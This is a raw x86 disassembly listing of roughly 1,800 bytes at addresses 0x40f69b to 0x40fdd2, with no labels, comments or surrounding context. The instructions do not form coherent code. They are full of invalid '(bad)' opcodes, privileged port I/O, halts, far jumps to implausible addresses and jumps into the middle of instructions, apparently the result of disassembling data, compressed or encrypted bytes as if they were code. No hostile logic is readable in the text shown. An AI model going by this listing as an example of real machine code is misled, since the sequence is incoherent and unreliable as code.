  40f69b:	js     0x40f681
  40f69d:	push   ecx
  40f69e:	loope  0x40f6a4
  40f6a0:	adc    dh,cl
  40f6a2:	adc    dh,BYTE PTR [eax+0x4]
  40f6a5:	enter  0x776,0x59
  40f6a9:	pop    esp
  40f6aa:	fnsave [edx]
  40f6ac:	jl     0x40f667
  40f6ae:	push   ecx
  40f6af:	(bad)  
  40f6b0:	xchg   edx,eax
  40f6b1:	dec    esp
  40f6b2:	pop    edx
  40f6b3:	mov    bh,0xa8
  40f6b5:	mov    esi,0xa6526c33
  40f6ba:	adc    edi,edx
  40f6bc:	xor    DWORD PTR [edx+eiz*8-0x5a],0xbf9d6754
  40f6c4:	retf   0x6521
  40f6c7:	sahf   
  40f6c8:	jne    0x40f728
  40f6ca:	bound  ecx,QWORD PTR [esi+eax*4]
  40f6cd:	add    eax,DWORD PTR ds:0x847baef0
  40f6d3:	pop    ebx
  40f6d4:	(bad)  
  40f6d5:	cld    
  40f6d6:	pop    ds
  40f6d7:	push   ss
  40f6d8:	ja     0x40f65a
  40f6da:	xchg   esi,eax
  40f6db:	jnp    0x40f723
  40f6dd:	pop    eax
  40f6de:	fcmovne st,st(5)
  40f6e0:	and    DWORD PTR [ecx-0x22e77691],esp
  40f6e6:	out    dx,eax
  40f6e7:	test   eax,0x87197873
  40f6ec:	lods   al,BYTE PTR ds:[esi]
  40f6ed:	call   DWORD PTR [edi]
  40f6ef:	cld    
  40f6f0:	add    bl,BYTE PTR [ebx+esi*1-0x2d953365]
  40f6f7:	pop    ebp
  40f6f8:	stc    
  40f6f9:	into   
  40f6fa:	ds jg  0x40f6f6
  40f6fd:	jl     0x40f685
  40f6ff:	in     al,dx
  40f700:	sbb    al,0xc6
  40f702:	push   ecx
  40f703:	mov    bh,0x67
  40f705:	push   ecx
  40f706:	add    DWORD PTR [edi+ebp*4-0x6],ebx
  40f70a:	arpl   WORD PTR [ebx+edi*8-0x26c1317e],sp
  40f711:	add    DWORD PTR cs:[edx],ebx
  40f714:	sub    dl,ch
  40f716:	jecxz  0x40f76c
  40f718:	pop    esp
  40f719:	lea    edi,[eax]
  40f71b:	int    0x21
  40f71d:	jl     0x40f6fc
  40f71f:	jmp    0xf85c93d5
  40f724:	mov    ds:0x1c44eb36,al
  40f729:	stos   BYTE PTR es:[edi],al
  40f72a:	and    DWORD PTR [ebp-0x41],0xffffffb9
  40f72e:	cdq    
  40f72f:	cmc    
  40f730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f731:	ficomp WORD PTR [ebx]
  40f733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f734:	stc    
  40f735:	or     ebp,DWORD PTR [esi+0x78]
  40f738:	sbb    al,0x26
  40f73a:	sub    bh,BYTE PTR [edi]
  40f73c:	mov    edi,edx
  40f73e:	ret    
  40f73f:	mov    bh,0xda
  40f741:	or     esp,DWORD PTR [ebx]
  40f743:	xchg   esi,eax
  40f744:	out    dx,eax
  40f745:	mov    bh,0xc6
  40f747:	jne    0x40f764
  40f749:	std    
  40f74a:	imul   esp,edi,0x9c91c0a2
  40f750:	loop   0x40f727
  40f752:	xlat   BYTE PTR ds:[ebx]
  40f753:	test   BYTE PTR [esi],cl
  40f755:	jo     0x40f7cc
  40f757:	push   ecx
  40f758:	add    DWORD PTR [ecx],ebp
  40f75a:	inc    esp
  40f75b:	clc    
  40f75c:	jae    0x40f6eb
  40f75e:	ret    
  40f75f:	sub    al,BYTE PTR [edi]
  40f761:	jns    0x40f7c6
  40f763:	mov    ss,WORD PTR [edx]
  40f765:	mov    gs:0x6a73cc13,al
  40f76b:	loop   0x40f742
  40f76d:	dec    eax
  40f76e:	aaa    
  40f76f:	push   0x65
  40f771:	cmp    al,0x76
  40f773:	adc    BYTE PTR [eax-0x6df1f22f],0x22
  40f77a:	scas   eax,DWORD PTR es:[edi]
  40f77b:	test   ecx,0xcdf73304
  40f781:	inc    ecx
  40f782:	(bad)  
  40f783:	jae    0x40f7e7
  40f785:	aaa    
  40f786:	into   
  40f787:	inc    edx
  40f788:	repz mov edx,0x65fd1fb2
  40f78e:	xchg   ebx,eax
  40f78f:	dec    ecx
  40f790:	or     bl,cl
  40f792:	xor    BYTE PTR [edi+0x4545c4a],ah
  40f798:	xlat   BYTE PTR ds:[ebx]
  40f799:	sbb    BYTE PTR [eax],dl
  40f79b:	xchg   ecx,eax
  40f79c:	mov    cl,0xf7
  40f79e:	fidivr DWORD PTR [eax-0x2f]
  40f7a1:	xlat   BYTE PTR ds:[ebx]
  40f7a2:	pusha  
  40f7a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7a4:	push   edx
  40f7a5:	and    eax,0xf9544b99
  40f7aa:	xchg   ecx,eax
  40f7ab:	push   eax
  40f7ac:	iret   
  40f7ad:	sbb    dl,BYTE PTR [esi]
  40f7af:	hlt    
  40f7b0:	addr16 jb 0x40f741
  40f7b3:	nop
  40f7b4:	dec    ebp
  40f7b5:	dec    ebx
  40f7b6:	test   DWORD PTR [edx+0x30d3bb45],edi
  40f7bc:	in     eax,dx
  40f7bd:	scas   eax,DWORD PTR es:[edi]
  40f7be:	jmp    0x9079:0x17b5c4d3
  40f7c5:	fwait
  40f7c6:	mov    esp,0x93986512
  40f7cb:	inc    ebx
  40f7cc:	jmp    DWORD PTR [esi-0x7b34def3]
  40f7d2:	jo     0x40f812
  40f7d4:	ret    
  40f7d5:	pop    esi
  40f7d6:	imul   edx
  40f7d8:	js     0x40f782
  40f7da:	mov    edx,ebx
  40f7dc:	int3   
  40f7dd:	push   ss
  40f7de:	outs   dx,DWORD PTR ds:[esi]
  40f7df:	cdq    
  40f7e0:	mov    eax,0xb2077422
  40f7e5:	ret    0x1188
  40f7e8:	mov    fs,esp
  40f7ea:	add    eax,0xcda01e4f
  40f7ef:	push   cs
  40f7f0:	fsincos 
  40f7f2:	adc    edi,DWORD PTR [ebx+0x70]
  40f7f5:	mov    dh,0x9f
  40f7f7:	aaa    
  40f7f8:	inc    esp
  40f7f9:	fcomip st,st(6)
  40f7fb:	fidiv  WORD PTR [eax+0x50a2347e]
  40f801:	mov    eax,ds:0xae4d0161
  40f806:	jae    0x40f87b
  40f808:	cdq    
  40f809:	cmc    
  40f80a:	sub    esp,DWORD PTR [esi+edi*1]
  40f80d:	adc    DWORD PTR [esi],ebp
  40f80f:	dec    eax
  40f810:	push   ecx
  40f811:	in     eax,dx
  40f812:	stc    
  40f813:	ins    DWORD PTR es:[edi],dx
  40f814:	icebp  
  40f815:	add    BYTE PTR [eax-0x970e28a],ah
  40f81b:	daa    
  40f81c:	or     ebp,esi
  40f81e:	fstp   QWORD PTR [ebp+0x53]
  40f821:	cmp    DWORD PTR [edx],eax
  40f823:	cld    
  40f824:	lods   al,BYTE PTR ds:[esi]
  40f826:	sbb    ebx,edi
  40f828:	push   ss
  40f829:	jb     0x40f8a8
  40f82b:	nop
  40f82c:	ins    DWORD PTR es:[edi],dx
  40f82d:	or     esi,ebp
  40f82f:	pop    esi
  40f830:	scas   eax,DWORD PTR es:[edi]
  40f831:	test   BYTE PTR [edx+esi*8-0x7d],cl
  40f835:	sbb    BYTE PTR [ebx-0x351dbbdc],ch
  40f83b:	mov    al,0xb3
  40f83d:	inc    ebx
  40f83e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f83f:	pop    ebx
  40f840:	(bad)
  40f843:	and    edi,DWORD PTR [ecx-0x5da4f5f1]
  40f849:	sub    cl,BYTE PTR [ebx+edi*2+0x69303261]
  40f850:	imul   esi,esi,0xffffffd5
  40f853:	lods   al,BYTE PTR ds:[esi]
  40f854:	xchg   ebp,eax
  40f855:	ins    BYTE PTR es:[edi],dx
  40f856:	jnp    0x40f80e
  40f858:	aaa    
  40f859:	adc    al,0xbe
  40f85b:	mov    edi,0x4f8a8876
  40f860:	fmul   st(3),st
  40f862:	in     al,dx
  40f863:	data16 lahf 
  40f865:	call   0x453a:0xb799a0e1
  40f86c:	lea    ecx,[edx]
  40f86e:	mov    ebp,0x8030601f
  40f873:	jae    0x40f82c
  40f875:	dec    ebp
  40f876:	iret   
  40f877:	jne    0x40f898
  40f879:	mov    dh,0xe4
  40f87b:	cwde   
  40f87c:	xchg   ebx,eax
  40f87d:	mov    ebp,0x811886ef
  40f882:	adc    eax,0x34980db
  40f887:	imul   edi,DWORD PTR [ecx+0x5c74a301],0x3d
  40f88e:	push   edi
  40f88f:	pop    ecx
  40f890:	and    al,al
  40f892:	adc    ecx,DWORD PTR [ebx]
  40f894:	mov    bl,0x96
  40f896:	push   es
  40f897:	test   al,0xd
  40f899:	or     DWORD PTR [eax+0x6c],edi
  40f89c:	loope  0x40f89c
  40f89e:	xadd   dh,al
  40f8a1:	xchg   ebp,eax
  40f8a2:	mov    cl,0xa3
  40f8a4:	stc    
  40f8a5:	adc    al,0x1c
  40f8a7:	lds    esi,FWORD PTR [edx-0x5a]
  40f8aa:	cmp    eax,0x2e623fe6
  40f8af:	add    cl,BYTE PTR [eax+0x32]
  40f8b2:	cli    
  40f8b3:	shl    BYTE PTR [esi+0x28],0x57
  40f8b7:	call   0xa82848f2
  40f8bc:	cwde   
  40f8bd:	sbb    eax,DWORD PTR [esp+ecx*4]
  40f8c0:	push   ss
  40f8c1:	xchg   DWORD PTR [eax-0x3ab7c5be],ecx
  40f8c7:	add    ebp,esp
  40f8c9:	add    esp,DWORD PTR [edx-0x548a44f5]
  40f8cf:	test   WORD PTR [eax],sp
  40f8d2:	mov    edi,0x1b9a47b1
  40f8d7:	jl     0x40f930
  40f8d9:	push   edi
  40f8da:	sti    
  40f8db:	pop    esi
  40f8dc:	and    ebp,DWORD PTR [ecx-0x47]
  40f8df:	lods   eax,DWORD PTR ds:[esi]
  40f8e0:	jno    0x40f87d
  40f8e2:	lods   eax,DWORD PTR ds:[esi]
  40f8e3:	mulps  xmm1,XMMWORD PTR [edx+edi*1-0x5fefb9af]
  40f8eb:	in     al,0x2
  40f8ed:	mov    esp,0x718d0b50
  40f8f2:	mov    edi,0x21e5d68c
  40f8f7:	js     0x40f8ff
  40f8f9:	js     0x40f8a4
  40f8fb:	scas   al,BYTE PTR es:[edi]
  40f8fc:	cwde   
  40f8fd:	jmp    0xea13:0x988aaae5
  40f904:	dec    ebp
  40f905:	stc    
  40f906:	mov    ah,0xb8
  40f908:	cli    
  40f909:	mov    cl,0x41
  40f90b:	in     al,dx
  40f90c:	int    0x19
  40f90e:	pop    ebp
  40f90f:	push   ebp
  40f910:	pop    ebx
  40f911:	xor    eax,0xb818732
  40f916:	std    
  40f917:	xor    DWORD PTR [si],edx
  40f91a:	pop    ss
  40f91b:	and    al,0xab
  40f91d:	dec    edx
  40f91e:	test   al,0xa9
  40f920:	in     al,dx
  40f921:	mov    eax,DWORD PTR [ebp+0xc]
  40f924:	aad    0x55
  40f926:	mov    esp,0xcd8e1930
  40f92b:	loop   0x40f9aa
  40f92d:	jle    0x40f968
  40f92f:	repz mov ch,0xd2
  40f932:	push   esp
  40f933:	outs   dx,BYTE PTR ds:[esi]
  40f934:	pop    esi
  40f935:	lahf   
  40f936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f937:	add    al,0x11
  40f939:	add    al,0xae
  40f93b:	pop    edx
  40f93c:	ror    BYTE PTR [esi+edx*1],cl
  40f93f:	mov    eax,0x59ca625f
  40f944:	xchg   esi,eax
  40f945:	pop    ebx
  40f946:	xor    edi,ebp
  40f948:	leave  
  40f949:	jae    0x40f983
  40f94b:	aad    0xfe
  40f94d:	cli    
  40f94e:	pop    ebx
  40f94f:	pop    ecx
  40f950:	sbb    al,bh
  40f952:	clc    
  40f953:	pop    eax
  40f954:	xchg   esi,ebx
  40f956:	aas    
  40f957:	adc    DWORD PTR [edi-0x1d],ebx
  40f95a:	push   0x56
  40f95c:	nop
  40f95d:	dec    ecx
  40f95e:	add    eax,0x4d2ce3d2
  40f963:	xchg   ebx,eax
  40f964:	into   
  40f965:	pop    edi
  40f966:	iret   
  40f967:	inc    esi
  40f968:	push   edi
  40f969:	sahf   
  40f96a:	dec    edx
  40f96b:	mov    dh,0xcf
  40f96d:	call   0x9c83f6de
  40f972:	jl     0x40f999
  40f974:	sbb    BYTE PTR [ebx+0x72],bh
  40f977:	add    ecx,ebp
  40f979:	inc    edx
  40f97a:	in     al,dx
  40f97b:	ds mov ecx,0x3e64c156
  40f981:	push   0x6064b944
  40f986:	stc    
  40f987:	inc    ebx
  40f988:	sub    ch,dh
  40f98a:	mov    ebx,0x2d0fb8d4
  40f98f:	mov    esp,0xdae260a2
  40f994:	push   es
  40f995:	mov    ch,0x14
  40f997:	in     eax,dx
  40f998:	mov    ebx,0x48aa3d91
  40f99d:	adc    bh,BYTE PTR [ebp+0x3830d43b]
  40f9a3:	sbb    al,0x84
  40f9a5:	and    DWORD PTR [ebx],eax
  40f9a7:	add    eax,0xf6ef8aa1
  40f9ac:	push   esp
  40f9ad:	add    dl,BYTE PTR [esi+ebx*4-0x285b5c50]
  40f9b4:	pop    eax
  40f9b5:	inc    ecx
  40f9b6:	sbb    al,0xbb
  40f9b8:	adc    BYTE PTR [esi],al
  40f9ba:	mov    bh,0x4d
  40f9bc:	mov    ds:0x77cf5b68,eax
  40f9c1:	std    
  40f9c2:	mov    ecx,0x96facf7e
  40f9c7:	ins    DWORD PTR es:[edi],dx
  40f9c8:	pop    es
  40f9c9:	in     al,dx
  40f9ca:	and    eax,0xaeb90d55
  40f9cf:	iret   
  40f9d0:	mov    ebp,0xc3d576e4
  40f9d5:	jp     0x40f9ca
  40f9d7:	xor    eax,0x27a2c309
  40f9dc:	inc    edi
  40f9dd:	adc    esp,0xa84a5ceb
  40f9e3:	std    
  40f9e4:	iret   
  40f9e5:	mov    esp,0x22a2554e
  40f9ea:	and    ax,si
  40f9ed:	mov    ds:0xf7a65c0b,al
  40f9f2:	push   ecx
  40f9f3:	inc    edi
  40f9f4:	mov    ebx,0xd2b109f0
  40f9f9:	retf   0xdddb
  40f9fc:	cmp    eax,0xddf793b8
  40fa01:	inc    ebp
  40fa02:	int3   
  40fa03:	inc    eax
  40fa04:	stos   BYTE PTR es:[edi],al
  40fa05:	into   
  40fa06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa07:	ret    0xacd5
  40fa0a:	stos   BYTE PTR es:[edi],al
  40fa0b:	jae    0x40f9c4
  40fa0d:	jbe    0x40fa21
  40fa0f:	in     eax,0xd8
  40fa11:	mov    bl,0xd7
  40fa13:	jns    0x40fa8f
  40fa15:	push   cs
  40fa16:	xchg   esi,eax
  40fa17:	shl    DWORD PTR [edi-0x7c],1
  40fa1a:	popa   
  40fa1b:	fsubr  QWORD PTR [edi+0x5fcbfc5c]
  40fa21:	sahf   
  40fa22:	sub    esp,esp
  40fa24:	sub    ebp,edi
  40fa26:	sbb    BYTE PTR [ecx+0x36a2bc4c],dl
  40fa2c:	aaa    
  40fa2d:	out    dx,eax
  40fa2e:	mov    ebx,0x81846bec
  40fa33:	pop    es
  40fa34:	dec    ebx
  40fa35:	cli    
  40fa36:	mov    al,0x13
  40fa38:	push   ecx
  40fa39:	adc    ecx,DWORD PTR [ecx-0x67]
  40fa3c:	gs (bad) 
  40fa3e:	mov    ds:0x45671acd,al
  40fa43:	mov    bl,0x9b
  40fa45:	cmc    
  40fa46:	ins    BYTE PTR es:[edi],dx
  40fa47:	and    al,0xa
  40fa49:	out    dx,al
  40fa4a:	int    0x79
  40fa4c:	je     0x40fa38
  40fa4e:	stc    
  40fa4f:	xchg   esi,eax
  40fa50:	or     al,0xdc
  40fa52:	ss jo  0x40fa33
  40fa55:	inc    edx
  40fa56:	cwde   
  40fa57:	xchg   ecx,eax
  40fa58:	into   
  40fa59:	or     al,0xba
  40fa5b:	ss mov edi,0xa0391cf4
  40fa61:	sub    al,0xe7
  40fa63:	add    al,0x88
  40fa65:	push   es
  40fa66:	jg     0x40fa44
  40fa68:	sti    
  40fa69:	xor    al,BYTE PTR [ebp-0x7bd267d1]
  40fa6f:	(bad)  
  40fa70:	mov    bl,0x68
  40fa72:	xchg   esp,eax
  40fa73:	pop    edx
  40fa74:	xchg   DWORD PTR [edi+0x5f],eax
  40fa77:	outs   dx,DWORD PTR ds:[esi]
  40fa78:	imul   ecx,edx,0xffffffc3
  40fa7b:	and    BYTE PTR [esi+edx*2-0x34a4e69d],dh
  40fa82:	fsubrp st(1),st
  40fa84:	(bad)  
  40fa85:	lds    eax,FWORD PTR [ebx+eiz*8]
  40fa88:	scas   al,BYTE PTR es:[edi]
  40fa89:	addr16 dec esi
  40fa8b:	xchg   edx,eax
  40fa8c:	fdiv   QWORD PTR [ebp-0x6e]
  40fa8f:	adc    al,0x74
  40fa91:	aam    0x77
  40fa93:	stc    
  40fa94:	sub    dh,BYTE PTR [edx-0x232bfe99]
  40fa9a:	push   ebp
  40fa9b:	lods   eax,DWORD PTR ds:[esi]
  40fa9d:	mov    ds:0x938b86ca,al
  40faa2:	jno    0x40fa9e
  40faa4:	sbb    al,0x65
  40faa6:	outs   dx,BYTE PTR ds:[esi]
  40faa7:	inc    BYTE PTR [edi]
  40faa9:	repnz bswap edx
  40faac:	xor    eax,DWORD PTR [eax+0x4e]
  40faaf:	ds pusha 
  40fab1:	xchg   ebp,eax
  40fab2:	jmp    0xeb205149
  40fab7:	jb     0x40fa3b
  40fab9:	mov    ecx,esp
  40fabb:	cs push 0xf
  40fabe:	or     edi,DWORD PTR [ecx+0x74fc9254]
  40fac4:	test   BYTE PTR [edi-0x6c],cl
  40fac7:	hlt    
  40fac8:	mov    ch,BYTE PTR [edx-0x59]
  40facb:	mov    esp,0x6cabf75a
  40fad0:	jnp    0x40fb38
  40fad2:	mov    ebp,0x650eafeb
  40fad7:	hlt    
  40fad8:	sbb    esi,ecx
  40fada:	test   eax,0xc19936
  40fadf:	js     0x40fa78
  40fae1:	pop    esp
  40fae2:	repz (bad) 
  40fae4:	xor    DWORD PTR [edi],ebx
  40fae6:	sub    DWORD PTR [edi],0xde5af9d9
  40faec:	sub    al,0xb5
  40faee:	sahf   
  40faef:	mov    al,ds:0xa262a931
  40faf4:	pop    eax
  40faf5:	add    esp,edx
  40faf7:	cmp    esi,DWORD PTR [ebx+0x51f10b3a]
  40fafd:	sbb    eax,0xbf6de264
  40fb02:	mov    dl,0x2d
  40fb04:	imul   edx,DWORD PTR ss:[eax-0x47c38646],0xffffffd8
  40fb0c:	fld    QWORD PTR gs:[ebp-0x62]
  40fb10:	adc    edx,edi
  40fb12:	mov    ds:0x79c8dc33,al
  40fb17:	loope  0x40fb90
  40fb19:	xchg   ebx,eax
  40fb1a:	mov    cl,0x7
  40fb1c:	xrelease lock sub BYTE PTR [ebp+eax*1-0x2],bl
  40fb22:	scas   eax,DWORD PTR es:[edi]
  40fb23:	(bad)  
  40fb24:	push   0x558d8199
  40fb29:	mov    bp,0x1ff5
  40fb2d:	out    dx,eax
  40fb2e:	adc    al,0xad
  40fb30:	mov    bh,0x79
  40fb32:	inc    esi
  40fb33:	xchg   edi,eax
  40fb34:	dec    edi
  40fb35:	(bad)  
  40fb36:	ffree  st(7)
  40fb38:	sub    cl,BYTE PTR [edi-0x7]
  40fb3b:	jge    0x40fabe
  40fb3d:	dec    ebp
  40fb3e:	xor    BYTE PTR [ecx+0x2],0xf7
  40fb42:	loopne 0x40fb25
  40fb44:	or     al,0x3b
  40fb46:	and    DWORD PTR [ecx],esp
  40fb48:	repz enter 0x30f8,0xe8
  40fb4d:	mov    ss,WORD PTR [edi+ebx*2+0x6be994b9]
  40fb54:	stos   BYTE PTR es:[edi],al
  40fb55:	fistp  QWORD PTR [eax-0x20]
  40fb58:	pop    ebx
  40fb59:	inc    eax
  40fb5a:	mov    ah,0x6f
  40fb5c:	cmp    BYTE PTR [eax+0x72fee3f3],al
  40fb62:	mov    bl,0xc7
  40fb64:	sbb    eax,0x8d56e774
  40fb69:	and    eax,DWORD PTR [edx-0x50]
  40fb6c:	jae    0x40fbc3
  40fb6e:	and    dl,BYTE PTR [edx+0x38]
  40fb71:	sub    bh,BYTE PTR [edx]
  40fb73:	pop    ds
  40fb74:	mov    ebx,0x306104b2
  40fb79:	(bad)  
  40fb7a:	jmp    0x3b4d:0x94546624
  40fb81:	aaa    
  40fb82:	inc    ebp
  40fb83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb84:	std    
  40fb85:	jp     0x40fb9c
  40fb87:	fcom   DWORD PTR [eax+0x7a90b679]
  40fb8d:	dec    eax
  40fb8e:	mov    eax,ds:0x6191a377
  40fb93:	pop    ecx
  40fb94:	fnstenv [esi-0x32f58d79]
  40fb9a:	mov    ch,0x74
  40fb9c:	add    DWORD PTR [edi-0x7dd37f6f],esp
  40fba2:	pusha  
  40fba3:	push   ebp
  40fba4:	ror    BYTE PTR [esi],cl
  40fba6:	sbb    DWORD PTR [ecx],esp
  40fba8:	mov    dl,0xae
  40fbaa:	inc    ebx
  40fbab:	or     eax,0xd8b70bbd
  40fbb0:	ficom  WORD PTR [ebp-0x471f65bc]
  40fbb6:	cs aam 0x64
  40fbb9:	clc    
  40fbba:	or     eax,0x72d1829a
  40fbbf:	pop    ss
  40fbc0:	lods   eax,DWORD PTR ds:[esi]
  40fbc1:	mov    ebx,DWORD PTR [edx-0x44]
  40fbc4:	xor    al,BYTE PTR [ebx+0x1451573b]
  40fbca:	dec    eax
  40fbcb:	pop    ebp
  40fbcc:	and    bh,BYTE PTR [eax+0x6]
  40fbcf:	add    BYTE PTR [eax+0x71],0xf0
  40fbd3:	jmp    0x40fc43
  40fbd5:	mov    gs,WORD PTR [eax-0x49]
  40fbd8:	sub    al,BYTE PTR [ebp+ebx*2-0x52]
  40fbdc:	cmp    ah,bl
  40fbde:	adc    al,0xa4
  40fbe0:	xor    DWORD PTR [esi+ebp*8+0x17],edx
  40fbe4:	mov    edi,0x6f8c2c67
  40fbe9:	mov    esi,0x5643838f
  40fbee:	in     al,0xc7
  40fbf0:	mov    al,0x81
  40fbf2:	mov    bh,0xd
  40fbf4:	mov    BYTE PTR [eax+0x33],dh
  40fbf7:	sbb    BYTE PTR [esp+esi*2+0x4edea177],dh
  40fbfe:	push   ebp
  40fbff:	inc    esi
  40fc00:	jmp    0xb17ae7e5
  40fc05:	mov    edx,0x977545e9
  40fc0a:	and    eax,DWORD PTR [edi-0x4a96efbf]
  40fc10:	(bad)  
  40fc13:	adc    bh,BYTE PTR [eax+0x6]
  40fc16:	enter  0xc00b,0x69
  40fc1a:	xor    eax,DWORD PTR [ecx]
  40fc1c:	lahf   
  40fc1d:	in     eax,dx
  40fc1e:	cmc    
  40fc1f:	dec    edx
  40fc20:	sti    
  40fc21:	push   cs
  40fc22:	mov    esi,ebx
  40fc24:	jo     0x40fc85
  40fc26:	rol    BYTE PTR [ecx+0x34dcb738],1
  40fc2c:	and    al,0xb9
  40fc2e:	mov    BYTE PTR [esi],dh
  40fc30:	add    edx,DWORD PTR ds:0xba4195e7
  40fc36:	call   0x28a316af
  40fc3b:	add    bl,al
  40fc3d:	je     0x40fc46
  40fc3f:	(bad)  
  40fc40:	int3   
  40fc41:	rol    DWORD PTR [eax],0x9c
  40fc44:	pop    ebp
  40fc45:	ret    0xba87
  40fc48:	mov    esp,0x49b4aa5a
  40fc4d:	jns    0x40fc24
  40fc4f:	jo     0x40fc76
  40fc51:	mov    dl,0x9a
  40fc53:	mov    bl,0x24
  40fc55:	in     eax,dx
  40fc56:	sti    
  40fc57:	pop    edi
  40fc58:	mov    ebx,0x5c94452
  40fc5d:	adc    eax,0x65d7115c
  40fc62:	mov    ch,0xd7
  40fc64:	and    eax,0x4582f715
  40fc69:	jl     0x40fbef
  40fc6b:	data16 ja 0x40fc82
  40fc6e:	and    al,bh
  40fc70:	or     al,0xb0
  40fc72:	data16 test al,0xc8
  40fc75:	mov    ds:0xd62a1f09,al
  40fc7a:	mov    ebx,0xa47490e0
  40fc7f:	daa    
  40fc80:	sahf   
  40fc81:	imul   eax,DWORD PTR [ecx+ebx*8+0x50],0xda1bd670
  40fc89:	rol    BYTE PTR [ecx-0xb6fe4d],cl
  40fc8f:	cmc    
  40fc90:	sar    BYTE PTR [ebp+0x58],1
  40fc93:	or     DWORD PTR [ecx],edx
  40fc95:	(bad)  
  40fc96:	div    DWORD PTR [ebp+edi*8+0x5dbb4604]
  40fc9d:	test   edx,esi
  40fc9f:	adc    al,0x52
  40fca1:	outs   dx,BYTE PTR ds:[esi]
  40fca2:	(bad)  
  40fca4:	or     eax,0xf5cddbcf
  40fca9:	in     eax,0xb1
  40fcab:	jmp    0x40fc79
  40fcad:	jg     0x40fd2a
  40fcaf:	retw   
  40fcb1:	retf   
  40fcb2:	cmp    bh,al
  40fcb4:	std    
  40fcb5:	and    DWORD PTR [eax-0x13],esp
  40fcb8:	xchg   ecx,eax
  40fcb9:	bound  edi,QWORD PTR [edx+0x13]
  40fcbc:	dec    ebp
  40fcbd:	leave  
  40fcbe:	pop    esi
  40fcbf:	mov    ebx,0xa7c1b797
  40fcc4:	mov    ds:0xd91193f7,eax
  40fcc9:	enter  0x6e72,0xd8
  40fccd:	fsubr  QWORD PTR [edx]
  40fccf:	aam    0x2d
  40fcd1:	lea    edi,fs:[eax-0x48]
  40fcd5:	sbb    BYTE PTR [edi-0x70],ah
  40fcd8:	push   eax
  40fcd9:	fisub  WORD PTR [ebx]
  40fcdb:	into   
  40fcdc:	dec    eax
  40fcdd:	in     al,0xed
  40fcdf:	or     eax,0xe908c1c5
  40fce4:	out    dx,al
  40fce5:	ret    
  40fce6:	cmp    DWORD PTR es:[edx-0x5],ecx
  40fcea:	scas   eax,DWORD PTR es:[edi]
  40fceb:	fnstenv [ecx]
  40fced:	mov    esp,0x2bdf3272
  40fcf2:	adc    BYTE PTR [edx+0x1baa6a00],dl
  40fcf8:	push   ebx
  40fcf9:	sub    dh,BYTE PTR [esi-0x45]
  40fcfc:	stos   BYTE PTR es:[edi],al
  40fcfd:	imul   ecx,esi,0xffffffc1
  40fd00:	sub    DWORD PTR [ebp+0x40bd884c],esp
  40fd06:	xchg   ebx,eax
  40fd07:	mov    esp,0x43ae0d44
  40fd0c:	jmp    0x3218:0x84d3b97b
  40fd13:	xchg   ebp,eax
  40fd14:	sub    BYTE PTR [ecx],bl
  40fd16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd17:	addr16 dec eax
  40fd19:	clc    
  40fd1a:	pop    edi
  40fd1b:	xchg   ecx,eax
  40fd1c:	or     DWORD PTR [ebx],eax
  40fd1e:	push   0x920f4b32
  40fd23:	loope  0x40fd23
  40fd25:	imul   esp,DWORD PTR [ebx-0x7d],0x44
  40fd29:	inc    esi
  40fd2a:	ins    BYTE PTR es:[edi],dx
  40fd2b:	aad    0xa8
  40fd2d:	les    edi,FWORD PTR [ecx+0x68]
  40fd30:	push   cs
  40fd31:	dec    eax
  40fd32:	jbe    0x40fd84
  40fd34:	mov    eax,DWORD PTR [ebx]
  40fd36:	ret    
  40fd37:	mov    eax,0xc1403acb
  40fd3c:	jp     0x40fd30
  40fd3e:	(bad)  
  40fd3f:	jp     0x40fd43
  40fd41:	stos   BYTE PTR es:[edi],al
  40fd42:	jno    0x40fdac
  40fd44:	xchg   esi,eax
  40fd45:	lahf   
  40fd46:	add    BYTE PTR [edi],0x24
  40fd49:	xor    dl,BYTE PTR [edx]
  40fd4b:	ds xchg esi,eax
  40fd4d:	mov    eax,ds:0x9689204f
  40fd52:	ins    BYTE PTR es:[edi],dx
  40fd53:	or     al,0x9b
  40fd55:	pop    edx
  40fd56:	repnz aam 0x84
  40fd59:	test   al,0xe3
  40fd5b:	inc    esi
  40fd5c:	and    ecx,eax
  40fd5e:	das    
  40fd5f:	int3   
  40fd60:	ret    0xe571
  40fd63:	sar    BYTE PTR [esp+edx*8],0xdb
  40fd67:	xor    DWORD PTR [ebp+0x32],eax
  40fd6a:	add    cl,al
  40fd6c:	xchg   ebp,eax
  40fd6d:	int    0x11
  40fd6f:	mov    cl,0x14
  40fd71:	push   ecx
  40fd72:	xchg   ebx,eax
  40fd73:	fisub  DWORD PTR [ecx-0x7ee5c467]
  40fd79:	in     eax,dx
  40fd7a:	(bad)  
  40fd7b:	cmp    BYTE PTR [eax+0x3c],0xb9
  40fd7f:	sub    ebp,DWORD PTR [edi-0x75ff1f26]
  40fd85:	fistp  QWORD PTR [esi]
  40fd87:	adc    cl,0x76
  40fd8a:	cld    
  40fd8b:	imul   eax,DWORD PTR [esi+edx*2+0x24],0xffffffbc
  40fd90:	scas   al,BYTE PTR es:[edi]
  40fd91:	pop    eax
  40fd92:	inc    ecx
  40fd93:	sub    al,BYTE PTR [bp+si]
  40fd96:	test   eax,0x79a0446a
  40fd9b:	rcr    edx,1
  40fd9d:	xor    BYTE PTR [ebp+0x6b],bh
  40fda0:	dec    eax
  40fda1:	push   ds
  40fda2:	stc    
  40fda3:	mov    ch,0xea
  40fda5:	jne    0x40fd56
  40fda7:	iret   
  40fda8:	pushf  
  40fda9:	ja     0x40fe08
  40fdab:	fnstcw WORD PTR [edi]
  40fdad:	cmc    
  40fdae:	imul   ebx,DWORD PTR [edx-0x67da0d1e],0xffffffee
  40fdb5:	sar    DWORD PTR [esp+edx*4],cl
  40fdb8:	in     eax,0xd8
  40fdba:	or     eax,DWORD PTR [edi]
  40fdbc:	cld    
  40fdbd:	xor    BYTE PTR [esi+0x585f9d14],bl
  40fdc3:	cmp    esp,DWORD PTR [eax-0x2]
  40fdc6:	add    al,0x6
  40fdc8:	repnz dec ebp
  40fdca:	mov    edx,0xccfe0ffc
  40fdcf:	xchg   esp,eax
  40fdd0:	(bad)  
  40fdd2:	xchg   esi,eax
